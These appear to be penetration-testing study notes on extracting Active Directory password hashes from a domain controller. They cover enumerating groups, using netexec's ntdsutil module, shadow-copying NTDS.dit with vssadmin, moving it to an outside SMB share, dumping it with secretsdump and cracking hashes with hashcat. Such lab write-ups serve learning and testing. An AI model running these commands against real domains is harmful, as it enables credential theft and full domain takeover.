
check groups user is member of:
```shell-session
> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
```


check user account privilege within the domain:
```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
```

This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.
# Faster way of extracting NTDS.dit Hashes
```shell-session
$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```
crack Nt HASH
```shell-session
$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```


# Manually extracting NTDS.dit hashes
#### Creating shadow copy of C:
We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the `C:` drive or where DS is installed 
```POWERSHELL
PS C:\> vssadmin CREATE SHADOW /For=C:
Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

copy NTDS.dit from the shadow copy volume:
```shell-session
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

move ntds.dit to smb share
```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

        1 file(s) moved.		
```

also copy register hives such as
```
SAM SECURITY SYSTEM
```
because you need system hive to decrypt the database


Extract hashes with secretsdump
```shell-session
$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
crack NT hash
```shell-session
$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
